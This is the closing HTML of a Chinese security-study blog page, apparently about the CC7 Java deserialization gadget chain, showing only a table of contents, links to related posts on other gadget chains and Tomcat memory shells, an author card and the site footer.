title="4、CC2"><img class="cover" src="/img/7.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-22</div><div class="title">4、CC2</div></div></a></div><div><a href="/2023/08/22/5%E3%80%81CC4/" title="5、CC4"><img class="cover" src="/img/8.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-22</div><div class="title">5、CC4</div></div></a></div><div><a href="/2023/08/22/6%E3%80%81CC5/" title="6、CC5"><img class="cover" src="/img/9.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-22</div><div class="title">6、CC5</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">lan</div><div class="author-info__description">在线笔记</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/fangmjiu"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/fangmjiu" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">学海无涯</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CC7"><span class="toc-number">1.</span> <span class="toc-text">CC7</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%89%88%E6%9C%AC"><span class="toc-number">1.1.</span> <span class="toc-text">利用版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC7-Demo"><span class="toc-number">1.2.</span> <span class="toc-text">CC7 Demo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-number">1.4.</span> <span class="toc-text">调用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hashtable-readObject"><span class="toc-number">1.4.1.</span> <span class="toc-text">Hashtable.readObject()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hashtable-reconstitutionPut"><span class="toc-number">1.4.2.</span> <span class="toc-text">Hashtable.reconstitutionPut()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AbstractMapDecorator-equals"><span class="toc-number">1.4.3.</span> <span class="toc-text">AbstractMapDecorator.equals()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AbstractMap-equals"><span class="toc-number">1.4.4.</span> <span class="toc-text">AbstractMap.equals()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LazyMap-get"><span class="toc-number">1.4.5.</span> <span class="toc-text">LazyMap.get()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E4%BB%A3%E7%A0%81"><span class="toc-number">1.5.</span> <span class="toc-text">其他代码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fakeTransformer"><span class="toc-number">1.5.1.</span> <span class="toc-text">fakeTransformer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lazyMap2-remove-%E2%80%9Cyy%E2%80%9D"><span class="toc-number">1.5.2.</span> <span class="toc-text">lazyMap2.remove(“yy”);</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.6.</span> <span class="toc-text">学习</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/08/25/8%E3%80%81CC7/" title="8、CC7"><img src="/img/12.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="8、CC7"/></a><div class="content"><a class="title" href="/2023/08/25/8%E3%80%81CC7/" title="8、CC7">8、CC7</a><time datetime="2023-08-25T01:39:14.000Z" title="发表于 2023-08-25 09:39:14">2023-08-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/22/Tomcat%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC/" title="Tomcat冰蝎内存马"><img src="/img/13.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Tomcat冰蝎内存马"/></a><div class="content"><a class="title" href="/2023/08/22/Tomcat%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC/" title="Tomcat冰蝎内存马">Tomcat冰蝎内存马</a><time datetime="2023-08-22T08:07:44.000Z" title="发表于 2023-08-22 16:07:44">2023-08-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/22/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/" title="Tomcat内存马"><img src="/img/12.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Tomcat内存马"/></a><div class="content"><a class="title" href="/2023/08/22/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/" title="Tomcat内存马">Tomcat内存马</a><time datetime="2023-08-22T07:53:56.000Z" title="发表于 2023-08-22 15:53:56">2023-08-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/22/URLDNS/" title="URLDNS"><img src="/img/11.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="URLDNS"/></a><div class="content"><a class="title" href="/2023/08/22/URLDNS/" title="URLDNS">URLDNS</a><time datetime="2023-08-22T07:14:34.000Z" title="发表于 2023-08-22 15:14:34">2023-08-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/22/TemplatesImpl/" title="TemplatesImpl"><img src="/img/6.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="TemplatesImpl"/></a><div class="content"><a class="title" href="/2023/08/22/TemplatesImpl/" title="TemplatesImpl">TemplatesImpl</a><time datetime="2023-08-22T03:20:38.000Z" title="发表于 2023-08-22 11:20:38">2023-08-22</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 By lan</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
